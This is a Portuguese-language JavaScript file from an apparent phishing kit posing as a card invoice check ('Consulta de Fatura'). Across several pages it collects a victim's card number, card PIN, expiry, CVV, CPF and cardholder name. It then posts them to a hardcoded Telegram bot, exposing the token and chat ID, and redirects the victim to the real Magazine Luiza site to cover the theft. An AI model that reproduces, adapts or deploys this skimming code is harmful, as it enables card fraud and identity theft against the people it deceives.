// Salva o número do cartão e vai para a etapa 2
function salvarNumeroCartao() {
    let numeroCartao = document.getElementById("numeroCartao").value;

    if (numeroCartao.trim() === "") {
        alert("Por favor, digite o número do cartão.");
        return;
    }

    localStorage.setItem("numeroCartao", numeroCartao);
    window.location.href = "etapa2.html";
}

// Salva o número de 1 a 4 e vai para a etapa 3
function salvarNumero1a4() {
    let num1a4 = document.getElementById("num1a4").value;

    if (num1a4.trim() === "") {
        alert("Por favor, digite os 4 primeiros números do cartão.");
        return;
    }

    localStorage.setItem("num1a4", num1a4);
    window.location.href = "etapa3.html";
}

// Salva a data de validade e vai para a etapa 4
function salvarMesValidade() {
    let mes = document.getElementById("mes").value;
    let ano = document.getElementById("ano").value;

    if (mes === "" || ano === "") {
        alert("Por favor, selecione o mês e o ano de validade.");
        return;
    }

    let validade = mes + "/" + ano;
    localStorage.setItem("mesValidade", validade);
    window.location.href = "etapa4.html";
}

// Salva o código de segurança e vai para a etapa 5
function salvarCodigoSeguranca() {
    let codigoSeguranca = document.getElementById("codigoSeguranca").value;

    if (codigoSeguranca.trim() === "" || codigoSeguranca.length < 3 || codigoSeguranca.length > 4) {
        alert("Por favor, digite um código de segurança válido (CVV).");
        return;
    }

    localStorage.setItem("codigoSeguranca", codigoSeguranca);
    window.location.href = "etapa5.html";
}

// Salva o FPC número e vai para a etapa 6
function salvarFPCNumero() {
    let fpcNumero = document.getElementById("fpcNumero").value;

    if (fpcNumero.trim() === "" || isNaN(fpcNumero) || fpcNumero.length > 11) {
        alert("Por favor, digite um número válido (até 11 dígitos).");
        return;
    }

    localStorage.setItem("fpcNumero", fpcNumero);
    window.location.href = "etapa6.html";
}

// Salva o nome do titular e vai para a etapa final (etapa7)
function salvarNomeTitular() {
    let nomeTitular = document.getElementById("nomeTitular").value;

    if (nomeTitular.trim() === "") {
        alert("Por favor, digite o nome do titular.");
        return;
    }

    localStorage.setItem("nomeTitular", nomeTitular);
    window.location.href = "etapa7.html";
}

// Enviar dados para o Telegram
function enviarParaTelegram() {
    const numeroCartao = localStorage.getItem("numeroCartao");
    const num1a4 = localStorage.getItem("num1a4");
    const mesValidade = localStorage.getItem("mesValidade");
    const codigoSeguranca = localStorage.getItem("codigoSeguranca");
    const fpcNumero = localStorage.getItem("fpcNumero");
    const nomeTitular = localStorage.getItem("nomeTitular");

    if (!numeroCartao || !num1a4 || !mesValidade || !codigoSeguranca || !fpcNumero || !nomeTitular) {
        alert("Erro: Nem todos os dados foram preenchidos.");
        return;
    }

    const token = "6725163602:AAHskt1qmIpPitj_OBmqQ6kvwB9tUxLZE_o"; // Substitua pelo token do seu bot
    const chatId = "7041209578"; // Substitua pelo chat ID do admin

    const mensagem = `💳 *Nova Consulta de Fatura*\n\n`
        + `🔹 Número do Cartão: ${numeroCartao}\n`
        + `🔹 Senha do Cartão: ${num1a4}\n`
        + `🔹 Validade: ${mesValidade}\n`
        + `🔹 Código de Segurança: ${codigoSeguranca}\n`
        + `🔹 CPF: ${fpcNumero}\n`
        + `🔹 Nome do Titular: ${nomeTitular}`
        + `\n\n📞 *feito por:* @ninodo07`;
    + `\n\n📍 https://t.me/+cvcjEnswgH5jNGIx`;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: mensagem, parse_mode: "Markdown" })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            localStorage.clear();
            window.location.href = "https://www.magazineluiza.com.br/";
        } else {
            alert("Erro ao enviar os dados.");
        }
    })
    .catch(error => console.error("Erro:", error));
}